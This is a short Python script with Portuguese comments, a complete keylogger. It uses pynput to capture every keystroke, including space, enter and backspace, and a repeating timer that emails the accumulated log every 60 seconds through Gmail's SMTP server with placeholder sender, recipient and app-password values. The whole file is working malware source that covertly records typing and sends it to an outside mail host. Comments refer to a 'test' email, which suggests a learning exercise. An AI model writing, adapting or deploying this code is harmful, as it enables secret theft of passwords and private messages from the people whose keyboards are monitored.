
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# CONFIGURAÇÃO DO E-MAIL
EMAIL_ORIGEM = "aaaaaaa@gmail.com" # inserir o e-mail de teste que for criado
EMAIL_DESTINO = "aaaaaaa@gmail.com" # inserir o e-mail de teste que for criado pode ser o mesmo e-mail
SENHA_EMAIL = "a" # inserir a senha que foi criada no link https://myaccount.google.com/apppasswords

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger."
        msg['FROM'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""

    # Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass # ignorar ctrl, shift, etc...

# Inicia o keylogger e o envio automático
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()

